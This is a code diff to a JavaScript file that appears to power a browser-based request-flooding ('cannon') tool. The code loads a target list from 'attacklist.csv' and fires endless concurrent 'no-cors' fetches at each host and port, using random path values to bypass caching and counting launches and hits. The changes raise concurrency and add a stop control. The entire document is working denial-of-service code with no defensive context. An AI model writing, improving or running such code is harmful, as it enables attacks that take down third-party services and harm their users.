@@ -1,6 +1,7 @@
 (function () {
   var elements = {
-    btn: document.getElementById("btnAction"),
+    btnStart: document.getElementById("btnAction"),
+    btnStop: document.getElementById("btnStop"),
     counter: document.getElementById("txtCounter"),
   };
 
@@ -13,6 +14,8 @@
     // TODO
   }
 
+  var isActive = false
+
   function refreshCounter() {
     elements.counter.innerHTML = `Launched: <strong>${counter.total}</strong>, Hit: <strong>${counter.hit}</strong>`;
   }
@@ -20,12 +23,12 @@
   window.getTargets = function (cb) {
     fetch("/attacklist.csv").then((res) => {
       res.text().then((list) => {
-        const targets = list
+        var targets = list
           .split("\n")
           .slice(1)
           .filter((i) => !!i)
           .map((i) => {
-            const row = i.split(",");
+            var row = i.split(",");
             return {
               title: row[0],
               method: row[1],
@@ -39,11 +42,17 @@
     });
   };
 
-  const getMaxConcurrent = function () {
-    return 10;
+  var getMaxConcurrent = function () {
+    return 20;
   }
 
-  const calcRequestBytes = function (method, uri, body) {
+  window.stopCannon = function() {
+    elements.btnStart.style.display = "initial";
+    elements.btnStop.style.display = "none";
+    isActive = false;
+  }
+
+  var calcRequestBytes = function (method, uri, body) {
       return method.length 
         + 1
         + uri
@@ -51,18 +60,19 @@
   }
 
   window.launchCannon = function (bytes, progressCb, done) {
-    const maxConcurrent = getMaxConcurrent();
+    var maxConcurrent = getMaxConcurrent();
+    elements.btnStart.style.display = "none";
+    elements.btnStop.style.display = "initial";
+    isActive = true;
 
     getTargets(function (targets) {
       function fireRequests() {
-        const target = targets[Math.floor(Math.random() * targets.length)];
-
+        var target = targets[Math.floor(Math.random() * targets.length)];
         function fire() {
-          var rand = Math.floor(Math.random() * 1000000) + new Date().getTime();
-
+          if (!isActive) { return }
           counter.total++;
+          var rand = `${Math.floor(Math.random() * 1000000)}-${new Date().getTime()}`;
           refreshCounter();
-
           fetch(`https://${target.host}:${target.port}/${(target.path || '').replace('{rand}', rand)}`, {
             method: target.method || 'GET',
             mode: "no-cors",
@@ -73,12 +83,10 @@
             fire();
           });
         }
-
         for (let i = 0; i <= maxConcurrent; i++) {
           fire()
         }
       }
-
       fireRequests();
     });
   };
